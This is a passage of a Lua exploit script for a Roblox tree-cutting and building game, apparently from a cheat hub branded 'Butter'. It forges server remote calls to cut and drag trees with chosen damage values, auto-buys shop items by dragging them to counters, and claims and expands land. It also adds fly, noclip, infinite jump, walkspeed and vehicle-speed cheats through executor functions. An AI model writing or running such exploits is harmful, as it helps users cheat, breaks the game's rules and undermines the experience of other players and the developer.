     game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(CutEvent, {["tool"] = game.Players.LocalPlayer.Character:FindFirstChild("Tool"), ["faceVector"] = Vector3.new(1, 0, 0), ["height"] = Height, ["sectionId"] = ID, ["hitPoints"] = HitPoints[game.Players.LocalPlayer.Character:FindFirstChild("Tool").ToolName.Value], ["cooldown"] = 0.25837870788574, ["cuttingClass"] = "Axe"})
 end

 local gs = function(service) return game:GetService(service) end
 local players = gs("Players")
 local client = players.LocalPlayer
 local b = game:GetService("ReplicatedStorage")
 DragModel1 = function(...)
     local d = {...}
     pcall(
         function()
             b.Interaction.ClientIsDragging:FireServer(d[1])
             b.Interaction.ClientIsDragging:FireServer(d[1])
             b.Interaction.ClientIsDragging:FireServer(d[1])
             b.Interaction.ClientIsDragging:FireServer(d[1])

         end
     )
     d[1]:MoveTo(d[2])
     d[1]:MoveTo(d[2])
     return d
 end
 local function table_foreach(table, callback)
     for i=1,#table do
         callback(i, table[i])
     end
 end

 local function getCFrame(part)
     local part = part or (client.Character and client.Character.HumanoidRootPart)
     if not part then return end
     return part.CFrame
 end

 local function tp(pos,infeaxerange)
     if infeaxerange then

     local pos = pos or client:GetMouse().Hit + Vector3.new(0, client.Character.HumanoidRootPart.Size.Y, 0)

     if typeof(pos) == "CFrame" then
         game:GetService("Lighting").HumanoidRootPart.CFrame = pos
     elseif typeof(pos) == "Vector3" then
         game:GetService("Lighting").HumanoidRootPart.Vector3 = Vector3.new(pos)
     end

     else
         local pos = pos or client:GetMouse().Hit + Vector3.new(0, client.Character.HumanoidRootPart.Size.Y, 0)

         if typeof(pos) == "CFrame" then
             client.Character:SetPrimaryPartCFrame(pos)
         elseif typeof(pos) == "Vector3" then
             client.Character:MoveTo(pos)
         end

     end
 end


 local  function getPosition(part)
     return getCFrame(part).Position
 end

 local  function getTools()
     client.Character.Humanoid:UnequipTools()
     local tools = {}
     table_foreach(client.Backpack:GetChildren(), function(_, v)
         if v.Name ~= "BlueprintTool" and v.Name ~= "Delete" and v.Name ~= "Undo" then
             tools[#tools + 1] = v
         end
     end)
     return tools
 end
 local function getToolStats(toolName)
     if typeof(toolName) ~= "string" then
         --print(toolName)
         toolName = toolName.ToolName.Value
     end
     return require(gs("ReplicatedStorage").AxeClasses['AxeClass_'..toolName]).new()
 end

 local function getBestAxe(treeClass)
     local tools = getTools()
     if #tools == 0 then
         return notifications:message{
             Title = "Butter",
             Description = "Need Axe",
             Icon = 6023426926
         }
     end
     local toolStats = {}
     local tool
     for _, v in next, tools do
         if treeClass == "LoneCave" and v.ToolName.Value == "EndTimesAxe" then
             tool = v
             break
         end
         local axeStats = getToolStats(v)
         if axeStats.SpecialTrees and axeStats.SpecialTrees[treeClass] then
             for i, v in next, axeStats.SpecialTrees[treeClass] do
                 axeStats[i] = v
             end
         end
         table.insert(toolStats, { tool = v, damage = axeStats.Damage })
     end
     if not tool and treeClass == "LoneCave" then
         return notifications:message{
             Title = "Butter",
             Description = "Need Endtimes Axe",
             Icon = 6023426926
         }
     end
     table.sort(toolStats, function(a, b)
         return a.damage > b.damage
     end)
     return true, tool or toolStats[1].tool
 end

 local function cutPart(event, section, height, tool, treeClass)
     local axeStats = getToolStats(tool)
     if axeStats.SpecialTrees and axeStats.SpecialTrees[treeClass] then
         for i, v in next, axeStats.SpecialTrees[treeClass] do
             axeStats[i] = v
         end
     end
     game:GetService'ReplicatedStorage'.Interaction.RemoteProxy:FireServer(event, {
         tool = tool,
         faceVector = Vector3.new(-1, 0, 0),
         height = height or 0.3,
         sectionId = section or 1,
         hitPoints = axeStats.Damage,
         cooldown = axeStats.SwingCooldown,
         cuttingClass = "Axe"
     })
 end
 local treeListener = function(treeClass, callback)
     local childAdded
     childAdded = workspace.LogModels.ChildAdded:Connect(function(child)
         local owner = child:WaitForChild("Owner")
         if owner.Value == client and child.TreeClass.Value == treeClass then
             childAdded:Disconnect()
             callback(child)
         end
     end)
 end
 local treeClasses = {}
 local treeRegions = {}

 task.spawn(function()
     while task.wait() do -- maybe do like a wait or something idk
         for _, v in next, workspace:GetChildren() do
             if v.Name == "TreeRegion" then
                 treeRegions[v] = {}
                 for _, v2 in next, v:GetChildren() do
                     if v2:FindFirstChild("TreeClass") and not table.find(treeClasses, v2.TreeClass.Value) then
                         table.insert(treeClasses, v2.TreeClass.Value)
                     end
                     if v2:FindFirstChild("TreeClass") and not table.find(treeRegions[v], v2.TreeClass.Value) then
                         table.insert(treeRegions[v], v2.TreeClass.Value)
                     end
                 end
             end
     end
     end
 end)

 local getBiggestTree = function(treeClass)
     local trees = {}
     for i, v in next, treeRegions do
         if table.find(v, treeClass) then
             for _, v2 in next, i:GetChildren() do
                 if v2:IsA("Model") and v2:FindFirstChild("Owner") then
                     if v2:FindFirstChild("TreeClass") and v2.TreeClass.Value == treeClass and v2.Owner.Value == nil or v2.Owner.Value == client then
                         local totalMass = 0
                         local treeTrunk
                         for _, v3 in next, v2:GetChildren() do
                             if v3:IsA("BasePart") then
                                 if v3:FindFirstChild("ID") and v3.ID.Value ==1 then
                                     treeTrunk = v3
                                 end
                                 totalMass = totalMass + v3:GetMass()
                             end
                         end
                         table.insert(trees, { tree = v2, trunk = treeTrunk, mass = totalMass })
                     end
                 end
             end
         end
     end
     table.sort(trees, function(a, b)
         return a.mass > b.mass
     end)
     return trees[1] or nil
 end

 getgenv().treeCut = false
 getgenv().treestop = true
 getgenv().doneend = true
 getgenv().Infeaxerange = nil

 local plrname = game:GetService("Players").LocalPlayer.Name

 local function bringTree(treeClass,godmodeval)
     getgenv().treestop = true
     game.Players.LocalPlayer.Character.Humanoid.BreakJointsOnDeath = false
     local lp =game. Players.LocalPlayer
     local success,data = getBestAxe(treeClass)

     local axeStats = getToolStats(data)

     local tree = getBiggestTree(treeClass)

     if not tree then
         return
         --print ("not findtree")
     end

     if not (tree.trunk.Size.X >= 1 and tree.trunk.Size.Y >= 2 and tree.trunk.Size.Z >= 1) then return print("To Small") end

     local oldPosition = getPosition()

     if godmodeval then Workspace.Camera.CameraType = "Fixed" GodMode(tree.trunk.CFrame) Workspace.Camera.CameraType = "Custom"
     tp(tree.trunk.CFrame)
     end
     wait(0.5)


     if getgenv().Infeaxerange and not godmodeval then
         infhrp()
     end


     treeListener(treeClass, function(tree)
         tree.PrimaryPart = tree:FindFirstChild("WoodSection")
         getgenv().treeCut = true


         for i=1,60 do
             DragModel1(tree,oldPosition)
             task.wait()

         end

     end)
     task.wait(0.15)



     task.spawn(function()
         if treeClass == "LoneCave" then
             getgenv().doneend = false
             repeat
                 if not getgenv().treestop then break end
                 tp(tree.trunk.CFrame)
                 task.wait()
             until getgenv().treeCut
         else
             repeat
                 if not getgenv().treestop then break end
                 tp(tree.trunk.CFrame,getgenv().Infeaxerange)

                 task.wait()
             until getgenv().treeCut
         end
     end)

     task.wait()

     if treeClass == "LoneCave" and godmodeval then

         numberofhits = calculateHitsForEndPart(tree.trunk)
         numberofhits = numberofhits - 1
         print(numberofhits)
         for i = 1,numberofhits do
         cutPart(tree.tree.CutEvent, 1, 0.3, data, treeClass)
         task.wait(1)
         end

         getgenv().treeCut = false
         getgenv().treestop = false

         DropTools()


         wait(0.3)
         workspace[plrname].HumanoidRootPart.CFrame = CFrame.new(-1675, 261, 1284)
         wait(0.5)

         pcall(function()
         repeat wait() until game.Players.LocalPlayer.Character.Humanoid.Health == 100
         end)
         wait(0.3)

     GetToolsfix()
     wait(0.5)

     bringTree("LoneCave",false)


     else
     repeat
     if not getgenv().treestop then break end
         cutPart(tree.tree.CutEvent, 1, 0.3, data, treeClass)
         task.wait()
     until getgenv().treeCut
     end

     if treeClass == "LoneCave" then
         wait(1)
         tp(oldPosition)
         getgenv().doneend = true
         getgenv().treeCut = false
         getgenv().treestop = false
     else

 if getgenv().Infeaxerange and not godmodeval then

         getgenv().treeCut = false

         infhrp(true)

         else

         wait(1)

         getgenv().treeCut = false

         tp(oldPosition)

         end
     end
 end

 getgenv().doneend = true

 getgenv().EndTree = false


 local TreeAdded = game:GetService("Workspace").LogModels.ChildAdded:Connect(function(v)
     if v:WaitForChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
         if v:WaitForChild("TreeClass") and v.TreeClass.Value == Type then
             if v:WaitForChild("WoodSection") then
                 if not v.PrimaryPart then
                     v.PrimaryPart = v:FindFirstChild("WoodSection")
                 end
                 for i = 1,50 do
                     game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
                     v:SetPrimaryPartCFrame(OldPos)
                     task.wait()
                     getgenv().EndTree = true
                 end
                 TreeChopped = true
                 if Type == "LoneCave" then
                     getgenv().treeCut = false
                     getgenv().treestop = false
                     getgenv().doneend = true
                     getgenv().SetSwing = false
                     getgenv().EndTree = true
                     if AxeAdded then
                         AxeAdded:Disconnect()
                     end
                     wait(10)
                 end
             end
         end
     end
 end)

  --#endregion


   --#region Vehicle Fly
  Players = game.Players
  IYMouse = Players.LocalPlayer:GetMouse()
  speaker = Players.LocalPlayer
  QEfly = true
  iyflyspeed = 1
  vehicleflyspeed = 1

  function getRoot(char)
      local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
      return rootPart
  end

  FLYING = false
  QEfly = true
  iyflyspeed = 1
  vehicleflyspeed = 1
  function sFLY(vfly)
      repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
      repeat wait() until IYMouse
      if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end

      local T = getRoot(Players.LocalPlayer.Character)
      local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
      local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
      local SPEED = 0

      local function FLY()
          FLYING = true
          local BG = Instance.new('BodyGyro')
          local BV = Instance.new('BodyVelocity')
          BG.P = 9e4
          BG.Parent = T
          BV.Parent = T
          BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
          BG.cframe = T.CFrame
          BV.velocity = Vector3.new(0, 0, 0)
          BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
          task.spawn(function()
              repeat wait()
                  if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
                      Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
                  end
                  if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
                      SPEED = 50
                  elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
                      SPEED = 0
                  end
                  if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
                      BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                      lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
                  elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
                      BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                  else
                      BV.velocity = Vector3.new(0, 0, 0)
                  end
                  BG.cframe = workspace.CurrentCamera.CoordinateFrame
              until not FLYING
              CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
              lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
              SPEED = 0
              BG:Destroy()
              BV:Destroy()
              if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
                  Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
              end
          end)
      end
      flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
          if KEY:lower() == 'w' then
              CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
          elseif KEY:lower() == 's' then
              CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
          elseif KEY:lower() == 'a' then
              CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
          elseif KEY:lower() == 'd' then
              CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
          elseif QEfly and KEY:lower() == 'e' then
              CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
          elseif QEfly and KEY:lower() == 'q' then
              CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
          end
          pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
      end)
      flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
          if KEY:lower() == 'w' then
              CONTROL.F = 0
          elseif KEY:lower() == 's' then
              CONTROL.B = 0
          elseif KEY:lower() == 'a' then
              CONTROL.L = 0
          elseif KEY:lower() == 'd' then
              CONTROL.R = 0
          elseif KEY:lower() == 'e' then
              CONTROL.Q = 0
          elseif KEY:lower() == 'q' then
              CONTROL.E = 0
          end
      end)
      FLY()
  end

  function NOFLY()
      FLYING = false
      if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
      if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
          Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
      end
      pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
  end
  --#endregion


   --#region Better Graphics
  function BetterG()
      local light = game.Lighting
      light:ClearAllChildren()
      local color = Instance.new("ColorCorrectionEffect",light)
      local bloom = Instance.new("BloomEffect",light)
      local sun = Instance.new("SunRaysEffect",light)
      local blur = Instance.new("BlurEffect",light)
      local config = {ColorCorrection = true;Sun = true;Lighting = true;BloomEffect = true;}
      color.Enabled = true
      color.Contrast = 0.15
      color.Brightness = 0.1
      color.Saturation = 0.25
      color.TintColor = Color3.fromRGB(255, 222, 211)
      sun.Enabled = true
      sun.Intensity = 0.2
      sun.Spread = 1
      bloom.Enabled = true
      bloom.Intensity = 1
      bloom.Size = 32
      bloom.Threshold = 1
      blur.Enabled = true
      blur.Size = 3
      light.Ambient = Color3.fromRGB(0, 0, 0)
      light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
      light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
      light.ExposureCompensation = 0
      light.GlobalShadows = true
      light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
      light.Outlines = false
  end
  --#endregion


   --#region Auto buy
  function CheckForItem(ItemType)
      for i,v in pairs(game:GetService("Workspace").Stores:GetChildren()) do
          if v.Name == "ShopItems" then
              for i,v in pairs(v:GetChildren()) do
                  if v:FindFirstChild("Owner") and v.Owner.Value == nil then
                      if v:FindFirstChild("BoxItemName") and tostring(v.BoxItemName.Value) == ItemType then
                          return true
                      end
                  end
              end
          end
      end
      return false
  end

  function GetPrice(Item,Amount)
      local Price = 0
      for i,v in next, game:GetService("ReplicatedStorage").ClientItemInfo:GetDescendants() do
          if v.Name == Item and v:FindFirstChild("Price") then
              Price = Price + v.Price.Value * Amount
          end
      end
      return Price
  end

  function GrabShopItems()
      local ItemList = {}
      for i,v in next,game:GetService("Workspace").Stores:GetChildren() do
          if v.Name == "ShopItems" then
              for i,v in next,v:GetChildren() do
                  if v:FindFirstChild("Type") and v.Type.Value ~= "Blueprint" and v:FindFirstChild("BoxItemName") then
                      if not table.find(ItemList,v.BoxItemName.Value.." - $"..GetPrice(v.BoxItemName.Value,1)) then
                          table.insert(ItemList,v.BoxItemName.Value.." - $"..GetPrice(v.BoxItemName.Value,1))
                          task.wait(0.01)
                      end
                  end
              end
          end
          table.sort(ItemList)
      end
      return ItemList
  end

  function UpdateNames()
      for i,v in next, game:GetService("Workspace").Stores:GetChildren() do
          if v.Name == "ShopItems" then
              v.ChildAdded:Connect(function(v)
                  v.Name = v:WaitForChild("BoxItemName").Value
              end)
              for i,v in next, v:GetChildren() do
                  if v:FindFirstChild("Owner") and v.Owner.Value == nil then
                      if v:FindFirstChild("BoxItemName") then
                          v.Name = v.BoxItemName.Value
                      end
                  end
              end
          end
      end
  end
  UpdateNames()

  function ItemPath(Item)
      for i,v in next, game:GetService("Workspace").Stores:GetChildren() do
          if v.Name == "ShopItems" then
              for i,v in next, v:GetChildren() do
                  if v:FindFirstChild("Owner") and v.Owner.Value == nil then
                      if v:FindFirstChild("BoxItemName") and tostring(v.BoxItemName.Value) == Item then
                          return v.Parent
                      end
                  end
              end
          end
      end
  end

  function GetCounter(Item)
      ClosestCounter = nil
      for i,v in next, game:GetService("Workspace").Stores:GetChildren() do
          if v.Name:lower() ~= "shopitems" then
              for i,v in next, v:GetChildren() do
                  if v.Name:lower() == "counter" then
                      if (Item.CFrame.p - v.CFrame.p).Magnitude <= 200 then
                          ClosestCounter = v
                      end
                  end
              end
          end
      end
      return ClosestCounter
  end

  function Pay(ID)
      spawn(function()
          game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer({["ID"] = ID,["Character"] = "name",["Name"] = "name",["Dialog"] = 'Dialog'}, "ConfirmPurchase");
      end)
  end
  local ItemBought
  function AutoBuy(Item,Amount,op,bpop)
     buytime = tick()
     if Item == nil then notifications:message{Title = "Butter",Description = "No item selected",Icon = 6023426926} return end
     if game.Players.LocalPlayer.leaderstats.Money.Value < GetPrice(Item,Amount) then return notifications:message{Title = "Butter",Description = "No money",Icon = 6023426926} end
     AbortAutoBuy = false
     local OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
     local Path = ItemPath(Item)

     for i = 1,Amount do

         if AbortAutoBuy then break end

         local Item = Path:WaitForChild(Item)

         local Counter = GetCounter(Item.Main)

         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Item.Main.CFrame + Vector3.new(5,0,5)

         repeat game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Item) task.wait() until Item.Owner.Value ~= nil

         if Item.Owner.Value ~= game.Players.LocalPlayer then break end

         repeat game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Item) task.wait() until isnetworkowner(Item.Main)

         game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Item)
         pcall(function()
         Item.Main.CFrame = Counter.CFrame + Vector3.new(0,Item.Main.Size.Y,0.5,0)
         end)
         task.wait(GetPing())

         pcall(function()
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Counter.CFrame + Vector3.new(5,0,5)
         end)

         task.wait(GetPing())

         repeat
             if AbortAutoBuy then break end
             game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Item)
             Pay(ShopIDS[Counter.Parent.Name])
             task.wait()
         until Item.Parent ~= "ShopItems"

         pcall(function()
             repeat game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Item) task.wait() until isnetworkowner(Item.Main)

             game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Item)
             Item.Main.CFrame = OldPos
             task.wait(GetPing())
         end)

         if op then
             game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(Item,"Open box")
         end

         if not bpop then
             ResizeBar(i,Amount)
         end

         task.wait()
     end

     if ItemBought then ItemBought:Disconnect() end

     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldPos + Vector3.new(5,1,0)
     if AbortAutoBuy then
         notifications:message{Title = "Butter",Description = "Aborted",Icon = 6023426926}
     else
         --print("done")
     end
     if not bpop then
     notifications:message{Title = "Butter",Description = "Done in ".. string.format('%.1fs', tick() - buytime),Icon = 6023426926}
     end
 end
  --#endregion


  --#region Slot
  function SellSoldSign()
      for i,v in next, game:GetService("Workspace").PlayerModels:GetChildren() do
          if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
              if v:FindFirstChild("ItemName") and v.ItemName.Value == "PropertySoldSign" then
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Main.CFrame.p) + Vector3.new(0,0,2)
                  game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(v,"Take down sold sign")
                  for i = 1,30 do
                      game:GetService("ReplicatedStorage").Interaction.ClientIsDragging:FireServer(v)
                      v.Main.CFrame = CFrame.new(314.54, -0.5, 86.823)
                      task.wait()
                  end
              end
          end
      end
  end

  function FreeLand()
      for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
          if v:FindFirstChild("Owner") and v.Owner.Value == nil then
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientPurchasedProperty:FireServer(v,v.OriginSquare.Position)
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,2,0)
              break
          end
      end
  end

  function MaxLand()
      for s,d in pairs(workspace.Properties:GetChildren()) do
          if d:FindFirstChild("Owner") and d:FindFirstChild("OriginSquare") and d.Owner.Value == game.Players.LocalPlayer then
              local PlotPos = d.OriginSquare.Position
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 40, PlotPos.Y, PlotPos.Z))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 40, PlotPos.Y, PlotPos.Z))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X , PlotPos.Y, PlotPos.Z + 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X , PlotPos.Y, PlotPos.Z - 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 40 , PlotPos.Y, PlotPos.Z + 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 40 , PlotPos.Y, PlotPos.Z - 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 40 , PlotPos.Y, PlotPos.Z + 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 40 , PlotPos.Y, PlotPos.Z - 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 80 , PlotPos.Y, PlotPos.Z))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 80 , PlotPos.Y, PlotPos.Z))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X , PlotPos.Y, PlotPos.Z + 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X , PlotPos.Y, PlotPos.Z - 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 80 , PlotPos.Y, PlotPos.Z + 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 80 , PlotPos.Y, PlotPos.Z - 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 80 , PlotPos.Y, PlotPos.Z + 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 80 , PlotPos.Y, PlotPos.Z - 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 40 , PlotPos.Y, PlotPos.Z + 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 40 , PlotPos.Y, PlotPos.Z + 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 80 , PlotPos.Y, PlotPos.Z + 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 80 , PlotPos.Y, PlotPos.Z - 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 80 , PlotPos.Y, PlotPos.Z + 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 80 , PlotPos.Y, PlotPos.Z - 40))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X + 40 , PlotPos.Y, PlotPos.Z - 80))
              game:GetService("ReplicatedStorage").PropertyPurchasing.ClientExpandedProperty:FireServer(d,CFrame.new(PlotPos.X - 40 , PlotPos.Y, PlotPos.Z - 80))
          end
      end
  end


  function VehicleSpeed(Val)
      for i,v in next, game:GetService("Workspace").PlayerModels:GetChildren() do
          if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer then
              if v:FindFirstChild("Type") and v.Type.Value == "Vehicle" then
                  if v:FindFirstChild("Configuration") then
                      v.Configuration.MaxSpeed.Value = Val
                  end
              end
          end
      end
  end


  function SitInAnyVehicle()
      game:GetService("Players").LocalPlayer.PlayerGui.Scripts.SitPermissions.Disabled = false
  end

  --#endregion


   --#region world
  function WalkOnWater(Val)
      for i,v in next, game:GetService("Workspace").Water:GetChildren() do
          if v.Name == "Water" then
              v.CanCollide = Val
          end
      end
  end

  function BridgeDown(Bridge)
      for i,v in next, game:GetService("Workspace").Bridge.VerticalLiftBridge.Lift:GetChildren() do
          if not Bridge then
              v.CFrame = v.CFrame + Vector3.new(0,26,0)
          else
              v.CFrame = v.CFrame - Vector3.new(0,26,0)
          end
      end
  end

  function RemoveWater(Val)
      for i,v in next, game:GetService("Workspace").Water:GetChildren() do
          if v.Name == "Water" then
              if not Val then
                  v.Transparency = 0
              else
                  v.Transparency = 1
              end
          end
      end
  end

  function ToggleShopDoors()
      for i,v in next, game:GetService("Workspace").Stores:GetChildren() do
          if v.Name ~= "ShopItems" then
              for i,v in next, v:GetChildren() do
                  if v.Name == "RDoor" or v.Name == "LDoor" then
                      game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(v.ButtonRemote_Toggle)
                  end
              end
          end
      end
  end

  function GetPlayersBase(Plr)
      for i,v in next, game:GetService("Workspace").Properties:GetChildren() do
          if v:FindFirstChild("Owner") and tostring(v.Owner.Value) == Plr then
              return v
          end
      end
      return false
  end
  --#endregion


    --#region Player Stuff
  function JumpPower(Val)
      game.Players.LocalPlayer.Character.Humanoid.JumpPower = Val
  end

  getgenv().Speed = 16
  function Walkspeed()
      game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
          game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = getgenv().Speed
      end)
      game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = getgenv().Speed
  end

  function NoClip(NoClipVal)
      if not NoClipVal then Clipping:Disconnect() return end
      Clipping = game:GetService("RunService").Stepped:connect(function()
          for i,v in next, game.Players.LocalPlayer.Character:GetChildren() do
              if v:IsA("Part") or v:IsA("BasePart") then
                  v.CanCollide = false
              end
          end
      end)
  end

  function InfiniteJump(Val)
      if not Val then IJ:Disconnect() return end
      IJ = game:GetService("UserInputService").JumpRequest:Connect(function()
          game.Players.LocalPlayer.Character:FindFirstChildOfClass"Humanoid":ChangeState("Jumping")
      end)
  end



  local Flyingkey

  local FlyingEnabled = false
  local maxspeed = 150
  function BetterFly()
      repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
      local mouse = game.Players.LocalPlayer:GetMouse()
      repeat wait() until mouse
      local plr = game.Players.LocalPlayer
      local torso = plr.Character.Head
      local flying = false
      local deb = true
      local ctrl = {f = 0, b = 0, l = 0, r = 0}
      local lastctrl = {f = 0, b = 0, l = 0, r = 0}
      local speed = 5000

      function Fly()
          local bg = Instance.new("BodyGyro", torso)
          bg.P = 9e4
          bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
          bg.cframe = torso.CFrame
          local bv = Instance.new("BodyVelocity", torso)
          bv.velocity = Vector3.new(0,0.1,0)
          bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
          repeat wait()
              plr.Character.Humanoid.PlatformStand = true
              if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
                  speed = maxspeed
              elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
                  speed = 0
              end
              if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
